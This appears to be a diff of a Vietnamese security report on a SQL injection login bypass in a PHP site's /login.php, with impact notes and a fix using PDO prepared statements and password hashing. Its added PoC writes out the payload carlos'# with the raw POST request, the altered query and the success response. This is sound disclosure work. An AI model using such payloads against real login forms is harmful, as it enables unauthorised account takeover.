@@ -72,37 +72,61 @@ Website được xây dựng theo mô hình **MVC (Model-View-Controller)** và 
 
 ## 🔥 Tầm Quan Trọng Của Phát Hiện Chính
 - **Mức độ**: 🔴 Cao  
-- **Ảnh hưởng**: Cho phép bypass xác thực, truy cập tài khoản admin mà không cần mật khẩu.  
-- **Hệ lụy**:
-  - Tấn công viên có thể đăng nhập vào tài khoản bất kỳ.
-  - Có thể leo thang đặc quyền nếu truy cập vào tài khoản admin.
-  - Khai thác sâu hơn bằng cách dump database nếu UNION-based SQLi hoạt động.  
+- **Ảnh hưởng**: Cho phép bypass xác thực password, truy cập tài khoản nếu biết username hợp lệ.  
+- **Hệ lụy**:  
+  - Tấn công viên có thể đăng nhập vào tài khoản bất kỳ mà không cần mật khẩu đúng.  
+  - Có thể leo thang đặc quyền nếu truy cập vào tài khoản admin.  
+  - Tiềm năng khai thác sâu hơn nếu kết hợp với các kỹ thuật SQLi khác (ví dụ: UNION).  
 
 ---
 
 ## 📌 Phát Hiện Chung
 - Truy vấn SQL tại **`/login.php`** không lọc đầu vào của biến `$username`.  
-- Cho phép thực hiện **SQL Injection** bằng cách chèn dữ liệu độc hại.  
-- Có thể bỏ qua xác thực bằng cách sử dụng ký tự `'` hoặc `#` để phá vỡ cú pháp SQL gốc.  
+- Cho phép thực hiện **SQL Injection** bằng cách chèn ký tự `#` để comment bỏ điều kiện password.  
+- Payload `carlos'#` (với `carlos` là username thật) bỏ qua kiểm tra password, cho phép login mà không cần mật khẩu đúng.  
+- Payload `' OR 1=1 --` không hoạt động do xử lý lỗi trong `Database.php`.  
 
 ---
 
-## Hệ thống và phương pháp đã thử nghiệm được sử dụng
-- **Hệ thống**: Windows 11, Laragon, PHP 8.3.16.  
-- **Phương pháp**: Inject thủ công qua form login, dùng Burp Suite capture request.  
-- **Tool**: Burp Suite, Firefox DevTools.  
+## 🛠 PoC - Bằng Chứng Khai Thác
 
+```plaintext
+📌 1. Payload Tấn Công:
+--------------------------------
+Username: carlos'#
+Password: (bất kỳ)
 
+🖥 2. Request Gửi Đến Server:
+--------------------------------
+POST /login.php HTTP/1.1
+Host: target-site.com
+Content-Type: application/x-www-form-urlencoded
+
+username=carlos'%23&password=randompassword
+
+🛠 3. Truy Vấn SQL Bị Thao Túng:
+--------------------------------
+SELECT * FROM users WHERE username = 'carlos'#' AND password = 'randompassword';
+
+✅ 4. Response Thành Công:
+--------------------------------
+HTTP/1.1 302 Found
+Location: /home.php
+
+🚨 5. Ảnh Chụp Màn Hình:
+--------------------------------
+![PoC SQL Injection](screenshots/sqli1.png)  
+![Burp Suite PoC](screenshots/sqli#.png)
 ## 🔧 Biện Pháp Khắc Phục Được Đề Xuất
-- **Sử dụng Prepared Statement (PDO / MySQLi) để bind tham số**.  
-- **Cấm sử dụng truy vấn SQL với chuỗi nối trực tiếp từ input người dùng**.  
-- **Bật chế độ báo lỗi và log lỗi thay vì hiển thị lỗi SQL ra ngoài**.  
-
- - Sửa lỗi bằng **Prepared Statement (PDO)**:
+Sử dụng Prepared Statement (PDO / MySQLi) để bind tham số:
 ```php
 $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
 $stmt->execute([$username, $password]);
 $user = $stmt->fetch();
 ```
-</details>
+- Không sử dụng truy vấn SQL với chuỗi nối trực tiếp từ input người dùng.
+- Bật chế độ báo lỗi và log lỗi thay vì hiển thị lỗi SQL ra ngoài.
+- Bổ sung hash password bằng password_hash() trong Register.php và verify bằng password_verify() trong Login.php.
+</details> 
+
 
